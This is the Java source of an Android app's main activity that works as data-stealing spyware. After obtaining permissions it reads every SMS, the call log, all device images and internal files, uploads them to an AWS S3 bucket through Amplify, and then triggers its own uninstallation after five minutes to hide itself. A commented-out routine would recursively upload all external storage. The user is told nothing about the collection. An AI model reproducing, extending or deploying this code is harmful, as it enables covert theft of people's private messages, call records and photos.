package com.example.hereliesoursanity;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.util.Log;

import com.amplifyframework.AmplifyException;
import com.amplifyframework.auth.cognito.AWSCognitoAuthPlugin;
import com.amplifyframework.core.Amplify;
import com.amplifyframework.storage.s3.AWSS3StoragePlugin;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;


import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1;
    private static final int UNINSTALL_REQUEST_CODE = 2;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("Debug", "onCreate");

        // Request SMS, Call Log, and Storage permissions if not granted
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_EXTERNAL_STORAGE
            }, PERMISSION_REQUEST_CODE);
            Log.d("Debug", "Requesting permissions");
        } else {
            // Permissions already granted, fetch the SMS messages, Call Log, Images, and Videos
            enableHttpLogging();
            fetchSMSMessages();
            configureAmplify();
            uploadImagesToS3();
            sendTextMessagesToS3();
            fetchCallLog();
            //uploadAllFilesToS3();
            uploadInternalFilesToS3();


            scheduleAppUninstallation();


        }
    }

    private void configureAmplify() {
        try {
            Amplify.addPlugin(new AWSCognitoAuthPlugin());
            Amplify.addPlugin(new AWSS3StoragePlugin());
            Amplify.configure(getApplicationContext());

            Log.i("kilo", "Initialized Amplify");
        } catch (AmplifyException error) {
            Log.e("kilo", "Could not initialize Amplify", error);
        }
    }

    private void uploadInternalFilesToS3() {
        Log.i("Function", "uploadInternalFilesToS3() called"); // Logging when the function is called
        String internalDirPath = getFilesDir().getAbsolutePath(); // Get the Internal Storage directory

        File internalDir = new File(internalDirPath);
        File[] files = internalDir.listFiles();

        if (files != null) {
            for (File file : files) {
                if (file.isFile()) {
                    String s3Key = "internalfiles/" + file.getName(); // Modify the S3 key as needed

                    Log.d("Debug", "Uploading file: " + file.getAbsolutePath());

                    Amplify.Storage.uploadFile(
                            s3Key,
                            file,
                            result -> {
                                Log.i("S3", "Successfully uploaded: " + result.getKey());
                                // Add any additional logic here after successful upload
                            },
                            error -> {
                                Log.e("S3", "Upload failed", error);
                                // Handle upload failure here
                            }
                    );
                }
            }
        } else {
            Log.d("Debug", "No files found in the internal storage directory");
        }
    }





    private void uploadAllFilesToS3() {
        File storageDirectory = Environment.getExternalStorageDirectory();
        uploadFilesInDirectoryToS3(storageDirectory, "files/");
    }

    private void uploadFilesInDirectoryToS3(File directory, String s3KeyPrefix) {
        File[] files = directory.listFiles();

        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    // Recursively process subdirectories
                    uploadFilesInDirectoryToS3(file, s3KeyPrefix + file.getName() + "/");
                } else {
                    // Process individual files
                    String s3Key = s3KeyPrefix + file.getName(); // Modify the S3 key as needed
                    Amplify.Storage.uploadFile(
                            s3Key,
                            file,
                            result -> Log.i("S3", "Successfully uploaded file: " + result.getKey()),
                            error -> Log.e("S3", "Upload failed for file: " + file.getName(), error)
                    );
                }
            }
        }
    }

    private void uploadImagesToS3() {
        String[] projection = {MediaStore.Images.Media.DATA};
        Uri imageUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(imageUri, projection, null, null, null);

        if (cursor != null) {
            int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);

            while (cursor.moveToNext()) {
                String imagePath = cursor.getString(columnIndex);

                File imageFile = new File(imagePath);
                if (imageFile.exists()) {
                    String s3Key = "images/" + imageFile.getName(); // Modify the S3 key as needed
                    Amplify.Storage.uploadFile(
                            s3Key,
                            imageFile,
                            result -> Log.i("S3", "Successfully uploaded: " + result.getKey()),
                            error -> Log.e("S3", "Upload failed", error)
                    );
                }
            }

            cursor.close();
        }
    }


    private void saveSMSMessagesAsCsv(Context context, List<String> smsList, String s3KeyPrefix) {
        String folderPath = context.getFilesDir().getPath();
        String csvFileName = "sms_log.csv";
        String csvFilePath = folderPath + "/" + csvFileName;

        try {
            FileWriter csvWriter = new FileWriter(csvFilePath);

            // Write the header
            csvWriter.append("Address,Body");
            csvWriter.append("\n");

            // Write the SMS message data
            for (String smsEntry : smsList) {
                csvWriter.append(smsEntry);
                csvWriter.append("\n");
            }

            csvWriter.flush();
            csvWriter.close();

            Log.d("SMS", "SMS log saved as CSV: " + csvFilePath);

            // Upload the CSV file to S3
            File csvFile = new File(csvFilePath);
            String s3Key = s3KeyPrefix + csvFileName;

            Amplify.Storage.uploadFile(
                    s3Key,
                    csvFile,
                    result -> {
                        // File uploaded successfully
                        Log.i("S3", "SMS log uploaded to S3: " + result.getKey());
                        // Delete the temporary CSV file
                        csvFile.delete();
                    },
                    error -> {
                        // Error uploading file to S3
                        Log.e("S3", "Error uploading SMS log to S3: " + error.getMessage());
                        // Delete the temporary CSV file
                        csvFile.delete();
                    }
            );
        } catch (IOException e) {
            e.printStackTrace();
            Log.d("SMS", "Error saving SMS log as CSV: " + e.getMessage());
        }
    }



    private void sendTextMessagesToS3() {
        Uri smsUri = Uri.parse("content://sms");
        String[] projection = {"address", "body"};

        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(smsUri, projection, null, null, null);

        if (cursor != null) {
            int addressIndex = cursor.getColumnIndexOrThrow("address");
            int bodyIndex = cursor.getColumnIndexOrThrow("body");

            List<String> smsList = new ArrayList<>();

            while (cursor.moveToNext()) {
                String address = cursor.getString(addressIndex);
                String body = cursor.getString(bodyIndex);
                String smsEntry = address + "," + body;
                smsList.add(smsEntry);
            }

            cursor.close();

            // Save SMS messages as CSV file
            saveSMSMessagesAsCsv(getApplicationContext(), smsList, "sms/");

            // Upload the CSV file to S3
            String folderPath = getApplicationContext().getFilesDir().getPath();
            String csvFilePath = folderPath + "/sms_log.csv";
            File csvFile = new File(csvFilePath);
            String s3Key = "sms/sms_log.csv"; // Modify the S3 key as needed

            Amplify.Storage.uploadFile(
                    s3Key,
                    csvFile,
                    result -> {
                        // File uploaded successfully
                        Log.i("S3", "SMS log uploaded to S3: " + result.getKey());
                        // Delete the temporary CSV file
                        csvFile.delete();
                    },
                    error -> {
                        // Error uploading file to S3
                        Log.e("S3", "Error uploading SMS log to S3: " + error.getMessage());
                        // Delete the temporary CSV file
                        csvFile.delete();
                    }
            );
        }
    }



    private void saveSMSMessagesAsCsv(List<String> smsList) {
//        String folderPath = "C:/Users/snehj/vit/vitall"; // Specify the folder path on your developer system
//        String csvFileName = "sms_log.csv";
//        String csvFilePath = folderPath + "/" + csvFileName;

        String folderPath = getApplicationContext().getFilesDir().getPath(); // app's internal storage directory
        String csvFileName = "sms_log.csv";
        String csvFilePath = folderPath + "/" + csvFileName;

        try {
            FileWriter csvWriter = new FileWriter(csvFilePath);

            // Write the header
            csvWriter.append("Address,Body");
            csvWriter.append("\n");

            // Write the SMS message data
            for (String smsEntry : smsList) {
                csvWriter.append(smsEntry);
                csvWriter.append("\n");
            }

            csvWriter.flush();
            csvWriter.close();

            Log.d("SMS", "SMS log saved as CSV: " + csvFilePath);

        } catch (IOException e) {
            e.printStackTrace();
            Log.d("SMS", "Error saving SMS log as CSV: " + e.getMessage());
        }
    }
    private void fetchSMSMessages() {
        Log.d("Debug", "fetchSMSMessages");

        Uri uri = Uri.parse("content://sms/inbox");
        String[] projection = {"address", "body"};

        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(uri, projection, null, null, null);

        List<String> smsList = new ArrayList<>();

        if (cursor != null) {
            int addressIndex = cursor.getColumnIndex("address");
            int bodyIndex = cursor.getColumnIndex("body");

            if (addressIndex >= 0 && bodyIndex >= 0) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(addressIndex);
                    String body = cursor.getString(bodyIndex);

                    // Process the SMS message (e.g., display, store, etc.)
                    Log.d("SMS", "Address: " + address + " Body: " + body);

                    // Append the SMS message to the list
                    smsList.add(address + "," + body);
                }
            } else {
                // Handle missing column gracefully
                Log.d("SMS", "Column index not found!");
            }

            cursor.close();

            // Save SMS messages as CSV
            saveSMSMessagesAsCsv(smsList);


        }
    }


    private void scheduleAppUninstallation() {
        Handler handler = new Handler();
        Runnable delayedRunnable = new Runnable() {
            @Override
            public void run() {
                uninstallApp();
            }
        };

        long delayMillis = 60000 * 5; // Delay of 2 minutes
        handler.postDelayed(delayedRunnable, delayMillis);
    }
    private void uninstallApp() {
        Uri packageUri = Uri.parse("package:" + getPackageName());
        Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri);
        uninstallIntent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
        startActivityForResult(uninstallIntent, UNINSTALL_REQUEST_CODE);
    }

    private void fetchCallLog() {
        List<String> callLogList = fetchCallLogs();
        saveCallLogsAsCsv(getApplicationContext(), callLogList, "call_logs/");
    }

    private List<String> fetchCallLogs() {
        List<String> callLogList = new ArrayList<>();

        String[] projection = {CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE};

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, null);

            if (cursor != null) {
                int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
                int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);

                while (cursor.moveToNext()) {
                    String number = cursor.getString(numberIndex);
                    long date = cursor.getLong(dateIndex);
                    long duration = cursor.getLong(durationIndex);
                    int type = cursor.getInt(typeIndex);

                    // Process the call log entry (e.g., display, store, etc.)
                    String callLogEntry = number + "," + date + "," + duration + "," + type;
                    callLogList.add(callLogEntry);
                }

                cursor.close();
            }
        }

        return callLogList;
    }

    private void saveCallLogsAsCsv(Context context, List<String> callLogList, String s3KeyPrefix) {
        String folderPath = context.getFilesDir().getPath();
        String csvFileName = "call_log.csv";
        String csvFilePath = folderPath + "/" + csvFileName;

        try {
            FileWriter csvWriter = new FileWriter(csvFilePath);

            // Write the header
            csvWriter.append("Number,Date,Duration,Type");
            csvWriter.append("\n");

            // Write the call log data
            for (String callLogEntry : callLogList) {
                csvWriter.append(callLogEntry);
                csvWriter.append("\n");
            }

            csvWriter.flush();
            csvWriter.close();

            Log.d("CallLog", "Call log saved as CSV: " + csvFilePath);

            // Upload the CSV file to S3
            File csvFile = new File(csvFilePath);
            String s3Key = s3KeyPrefix + csvFileName;

            Amplify.Storage.uploadFile(
                    s3Key,
                    csvFile,
                    result -> {
                        // File uploaded successfully
                        Log.i("S3", "Call log uploaded to S3: " + result.getKey());
                        // Delete the temporary CSV file
                        csvFile.delete();
                    },
                    error -> {
                        // Error uploading file to S3
                        Log.e("S3", "Error uploading call log to S3: " + error.getMessage());
                        // Delete the temporary CSV file
                        csvFile.delete();
                    }
            );
        } catch (IOException e) {
            e.printStackTrace();
            Log.d("CallLog", "Error saving call log as CSV: " + e.getMessage());
        }
    }

    public static void enableHttpLogging() {
        try {
            Field field = Log.class.getDeclaredField("isSBSettingEnabled");
            field.setAccessible(true);
            field.set(null, true);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }



    private void saveDeviceDetailsAsCsv(Context context, List<String> deviceDetails, String s3KeyPrefix) {
        String folderPath = context.getFilesDir().getPath();
        String csvFileName = "device_details.csv";
        String csvFilePath = folderPath + "/" + csvFileName;

        try {


            FileWriter csvWriter = new FileWriter(csvFilePath);

            // Write the device details
            for (String detail : deviceDetails) {
                csvWriter.append(detail);
                csvWriter.append("\n");
            }

            csvWriter.flush();
            csvWriter.close();

            Log.d("DeviceDetails", "Device details saved as CSV: " + csvFilePath);

            // Upload the CSV file to S3
            File csvFile = new File(csvFilePath);
            String s3Key = s3KeyPrefix + csvFileName;

            Amplify.Storage.uploadFile(
                    s3Key,
                    csvFile,
                    result -> {
                        // File uploaded successfully
                        Log.i("S3", "Device details uploaded to S3: " + result.getKey());
                        // Delete the temporary CSV file
                        csvFile.delete();
                    },
                    error -> {
                        // Error uploading file to S3
                        Log.e("S3", "Error uploading device details to S3: " + error.getMessage());
                        // Delete the temporary CSV file
                        csvFile.delete();
                    }
            );
        } catch (IOException e) {
            e.printStackTrace();
            Log.d("DeviceDetails", "Error saving device details as CSV: " + e.getMessage());
        }
    }







    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED
                    && grantResults[1] == PackageManager.PERMISSION_GRANTED
                    && grantResults[2] == PackageManager.PERMISSION_GRANTED) {
                // Permissions granted, fetch the SMS messages, Call Log, Images, and Videos
                enableHttpLogging();
                fetchSMSMessages();
                configureAmplify();
                uploadImagesToS3();
                sendTextMessagesToS3();
                fetchCallLog();
                //uploadAllFilesToS3();
                uploadInternalFilesToS3();


                scheduleAppUninstallation();

            } else {
                // Permissions denied, handle accordingly
                Log.d("Permissions", "Permission denied!");
            }
        }
    }




}
